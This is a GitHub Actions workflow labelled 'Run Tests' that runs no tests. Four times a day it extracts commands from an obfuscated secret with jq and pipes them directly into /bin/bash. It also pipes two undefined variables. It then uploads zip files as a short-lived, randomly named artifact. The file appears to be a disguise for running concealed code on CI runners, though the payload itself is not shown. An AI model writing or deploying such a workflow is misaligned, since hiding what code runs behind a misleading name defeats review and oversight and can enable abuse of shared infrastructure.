name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '0 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          kjt90: ${{ secrets.kjt90 }}
        run: |
          printf '%s' "$kjt90" | jq -r .zdqs14434 | /bin/bash
          printf '%s' "$pcse25" | jq -r .yswgr4741 | /bin/bash
          printf '%s' "$df29953" | jq -r .q2 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: mIU1YgjP
          path: "*.zip"
          retention-days: 1
